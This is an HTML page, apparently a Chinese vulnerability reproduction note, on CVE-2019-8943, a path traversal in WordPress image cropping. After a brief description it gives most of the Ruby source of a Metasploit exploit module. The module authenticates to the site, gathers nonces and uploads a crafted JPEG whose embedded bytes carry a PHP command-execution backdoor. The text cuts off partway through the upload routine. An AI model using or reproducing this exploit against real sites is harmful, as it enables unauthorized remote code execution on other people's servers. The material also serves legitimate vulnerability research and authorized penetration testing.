<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="X19409dd1961565a78320e693942ddd4ba0bbec0"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2019-8943</span><span class="csECDA2D3">）</span><span class="csDE05BCC">WordPress 5.0.0 - Crop-image Shell Upload (Metasploit)</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">WordPress</span><span class="cs9C1B1871">通过</span><span class="cs8926E06">5.0.3</span><span class="cs9C1B1871">允许在</span><span class="cs8926E06">wp_crop_image</span><span class="cs9C1B1871">（）中进行路径遍历。攻击者（具有裁剪图像的特权）可以通过包含两个图像扩展名和</span><span class="cs8926E06">../</span><span class="cs9C1B1871">序列的文件名，例如以</span><span class="cs8926E06">.jpg</span><span class="cs9C1B1871">？</span><span class="cs8926E06">/../../</span><span class="cs9C1B1871">结尾的文件名，将输出图像写入任意目录。</span><span class="cs8926E06"> file.jpg</span><span class="cs9C1B1871">子字符串。</span></p><h2 class="cs868C439D">
			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">保存内容为</span><span class="cs8926E06">xxx.md </span><span class="cs9C1B1871">并放到</span><span class="cs8926E06">msf</span><span class="cs9C1B1871">运行的目录下</span></p><p class="cs3A447A38"><span class="cs9FB05234">##</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># This module requires Metasploit: https://metasploit.com/download</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Current source: https://github.com/rapid7/metasploit-framework</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">##</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">class MetasploitModule &lt; Msf::Exploit::Remote</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;Rank = ExcellentRanking</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;include Msf::Exploit::FileDropper</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;include Msf::Exploit::Remote::HTTP::Wordpress</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;def initialize(info = {})</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;super(update_info(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;info,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Name&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt; &#39;WordPress Crop-image Shell Upload&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Description&#39; &nbsp;&nbsp;&nbsp;&nbsp;=&gt; %q{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This module exploits a path traversal and a local file inclusion</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;vulnerability on WordPress versions 5.0.0 and &lt;= 4.9.8.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The crop-image function allows a user, with at least author privileges,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;to resize an image and perform a path traversal by changing the _wp_attached_file</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;reference during the upload. The second part of the exploit will include</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this image in the current theme by changing the _wp_page_template attribute</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;when creating a post.</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This exploit module only works for Unix-based systems currently.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;},</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;License&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt; MSF_LICENSE,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Author&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;RIPSTECH Technology&#39;, &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Discovery</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Wilfried Becard &lt;wilfried.becard@synacktiv.com&gt;&#39; &nbsp;&nbsp;&nbsp;# Metasploit module</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;],</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;References&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ &#39;CVE&#39;, &#39;2019-8942&#39; ],</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ &#39;CVE&#39;, &#39;2019-8943&#39; ],</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ &#39;URL&#39;, &#39;https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/&#39;]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;],</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;DisclosureDate&#39; &nbsp;=&gt; &#39;Feb 19 2019&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Platform&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt; &#39;php&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Arch&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt; ARCH_PHP,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;Targets&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt; [[&#39;WordPress&#39;, {}]],</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;DefaultTarget&#39; &nbsp;&nbsp;=&gt; 0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;))</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;register_options(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OptString.new(&#39;USERNAME&#39;, [true, &#39;The WordPress username to authenticate with&#39;]),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OptString.new(&#39;PASSWORD&#39;, [true, &#39;The WordPress password to authenticate with&#39;])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;end</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;def check</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;cookie = wordpress_login(username, password)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if cookie.nil?</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;store_valid_credential(user: username, private: password, proof: cookie)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return CheckCode::Safe</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;end</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;CheckCode::Appears</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;end</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;def username</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;datastore[&#39;USERNAME&#39;]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;end</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;def password</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;datastore[&#39;PASSWORD&#39;]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;end</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;def get_wpnonce(cookie)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;uri = normalize_uri(datastore[&#39;TARGETURI&#39;], &#39;wp-admin&#39;, &#39;media-new.php&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;res = send_request_cgi(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;method&#39; &nbsp;&nbsp;&nbsp;=&gt; &#39;GET&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;uri&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt; uri,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;cookie&#39; =&gt; cookie</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if res &amp;&amp; res.code == 200 &amp;&amp; res.body &amp;&amp; !res.body.empty?</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res.get_hidden_inputs.first[&quot;_wpnonce&quot;]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;end</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;end</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;def get_wpnonce2(image_id, cookie)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;uri = normalize_uri(datastore[&#39;TARGETURI&#39;], &#39;wp-admin&#39;, &#39;post.php&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;res = send_request_cgi(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;method&#39; &nbsp;&nbsp;&nbsp;=&gt; &#39;GET&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;uri&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt; uri,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;cookie&#39; &nbsp;&nbsp;&nbsp;=&gt; cookie,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;vars_get&#39; &nbsp;=&gt; {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;post&#39; &nbsp;&nbsp;=&gt; image_id,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;action&#39; =&gt; &quot;edit&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if res &amp;&amp; res.code == 200 &amp;&amp; res.body &amp;&amp; !res.body.empty?</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tmp = res.get_hidden_inputs</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wpnonce2 = tmp[1].first[1]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;end</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;end</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;def get_current_theme</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;uri = normalize_uri(datastore[&#39;TARGETURI&#39;])</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;res = send_request_cgi!(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;method&#39; &nbsp;&nbsp;&nbsp;=&gt; &#39;GET&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;uri&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt; uri</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fail_with(Failure::NotFound, &#39;Failed to access Wordpress page to retrieve theme.&#39;) unless res &amp;&amp; res.code == 200 &amp;&amp; res.body &amp;&amp; !res.body.empty?</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;theme = res.body.scan(/\/wp-content\/themes\/(\w+)\//).flatten.first</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fail_with(Failure::NotFound, &#39;Failed to retrieve theme&#39;) unless theme</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;theme</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;end</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;def get_ajaxnonce(cookie)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;uri = normalize_uri(datastore[&#39;TARGETURI&#39;], &#39;wp-admin&#39;, &#39;admin-ajax.php&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;res = send_request_cgi(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;method&#39; &nbsp;&nbsp;&nbsp;=&gt; &#39;POST&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;uri&#39; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt; uri,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;cookie&#39; =&gt; cookie,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;vars_post&#39; &nbsp;=&gt; {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;action&#39; =&gt; &#39;query-attachments&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;post_id&#39; =&gt; &#39;0&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;query[item]&#39; =&gt; &#39;43&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;query[orderby]&#39; =&gt; &#39;date&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;query[order]&#39; =&gt; &#39;DESC&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;query[posts_per_page]&#39; =&gt; &#39;40&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;query[paged]&#39; =&gt; &#39;1&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fail_with(Failure::NotFound, &#39;Unable to reach page to retrieve the ajax nonce&#39;) unless res &amp;&amp; res.code == 200 &amp;&amp; res.body &amp;&amp; !res.body.empty?</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;a_nonce = res.body.scan(/&quot;edit&quot;:&quot;(\w+)&quot;/).flatten.first</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;fail_with(Failure::NotFound, &#39;Unable to retrieve the ajax nonce&#39;) unless a_nonce</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;a_nonce</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;end</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;def upload_file(img_name, wp_nonce, cookie)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;img_data = %w[</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FF D8 FF E0 00 10 4A 46 49 46 00 01 01 01 00 60 00 60 00 00 FF ED 00 38 50 68 6F</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;74 6F 73 68 6F 70 20 33 2E 30 00 38 42 49 4D 04 04 00 00 00 00 00 1C 1C 02 74 00</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10 3C 3F 3D 60 24 5F 47 45 54 5B 30 5D 60 3B 3F 3E 1C 02 00 00 02 00 04 FF FE 00</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3B 43 52 45 41 54 4F 52 3A 20 67 64 2D 6A 70 65 67 20 76 31 2E 30 20 28 75 73 69</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;6E 67 20 49 4A 47 20 4A 50 45 47 20 76 38 30 29 2C 20 71 75 61 6C 69 74 79 20 3D</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;20 38 32 0A FF DB 00 43 00 06 04 04 05 04 04 06 05 05 05 06 06 06 07 09 0E 09 09</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;08 08 09 12 0D 0D 0A 0E 15 12 16 16 15 12 14 14 17 1A 21 1C 17 18 1F 19 14 14 1D</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;27 1D 1F 22 23 25 25 25 16 1C 29 2C 28 24 2B 21 24 25 24 FF DB 00 43 01 06 06 06</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;09 08 09 11 09 09 11 24 18 14 18 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;24 24 24 24 24 24 24 FF C0 00 11 08 00 C0 01 06 03 01 22 00 02 11 01 03 11 01 FF</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C4 00 1F 00 00 01 05 01 01 01 01 01 01 00 00 00 00 00 00 00 00 01 02 03 04 05 06</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;07 08 09 0A 0B FF C4 00 B5 10 00 02 01 03 03 02 04 03 05 05 04 04 00 00 01 7D 01</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;02 03 00 04 11 05 12 21 31 41 06 13 51 61 07 22 71 14 32 81 91 A1 08 23 42 B1 C1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;15 52 D1 F0 24 33 62 72 82 09 0A 16 17 18 19 1A 25 26 27 28 29 2A 34 35 36 37 38</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;39 3A 43 44 45 46 47 48 49 4A 53 54 55 56 57 58 59 5A 63 64 65 66 67 68 69 6A 73</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;74 75 76 77 78 79 7A 83 84 85 86 87 88 89 8A 92 93 94 95 96 97 98 99 9A A2 A3 A4</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A5 A6 A7 A8 A9 AA B2 B3 B4 B5 B6 B7 B8 B9 BA C2 C3 C4 C5 C6 C7 C8 C9 CA D2 D3 D4</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D5 D6 D7 D8 D9 DA E1 E2 E3 E4 E5 E6 E7 E8 E9 EA F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FF</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C4 00 1F 01 00 03 01 01 01 01 01 01 01 01 01 00 00 00 00 00 00 01 02 03 04 05 06</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;07 08 09 0A 0B FF C4 00 B5 11 00 02 01 02 04 04 03 04 07 05 04 04 00 01 02 77 00</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;01 02 03 11 04 05 21 31 06 12 41 51 07 61 71 13 22 32 81 08 14 42 91 A1 B1 C1 09</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;23 33 52 F0 15 62 72 D1 0A 16 24 34 E1 25 F1 17 18 19 1A 26 27 28 29 2A 35 36 37</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;38 39 3A 43 44 45 46 47 48 49 4A 53 54 55 56 57 58 59 5A 63 64 65 66 67 68 69 6A</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;73 74 75 76 77 78 79 7A 82 83 84 85 86 87 88 89 8A 92 93 94 95 96 97 98 99 9A A2</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A3 A4 A5 A6 A7 A8 A9 AA B2 B3 B4 B5 B6 B7 B8 B9 BA C2 C3 C4 C5 C6 C7 C8 C9 CA D2</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D3 D4 D5 D6 D7 D8 D9 DA E2 E3 E4 E5 E6 E7 E8 E9 EA F2 F3 F4 F5 F6 F7 F8 F9 FA FF</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DA 00 0C 03 01 00 02 11 03 11 00 3F 00 3C 3F 3D 60 24 5F 47 45 54 5B 30 5D 60 3B</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3F 3E</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;img_data = 